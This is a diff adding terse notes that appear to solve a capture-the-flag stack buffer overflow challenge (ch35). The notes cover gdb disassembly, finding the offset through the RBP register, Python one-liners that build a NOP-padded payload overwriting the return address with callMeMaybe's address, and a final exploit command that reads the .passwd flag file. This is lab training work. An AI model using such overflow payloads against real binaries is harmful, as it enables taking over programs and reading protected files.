@@ -1,0 +1,23 @@
+gdb ch35
+disas callMeMaybe
+ex :  0x00000000004006cd <+0>:	push   rbp
+mkdir /tmp/elivet
+cd /tmp/elivet
+touch pok
+python -c 'print("\x90"*268 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' > /tmp/elivet/pok
+
+gdb ch35
+run < /tmp/elivet/pok
+ex : RBP: 0x4C4B4A4948474645
+traduction hexa -> ascii 
+ex : RBP: E...............L
+Quit
+
+stop at the first letter found in RBP 
+python -c 'print("\x90"*268 + "ABCD" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' > /tmp/elivet/pok
+
+gdb ch35
+run < /tmp/elivet/pok
+
+(python -c 'print("\x90"*276 + "ABCD" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' && cat) | ./ch35
+cat .passwd
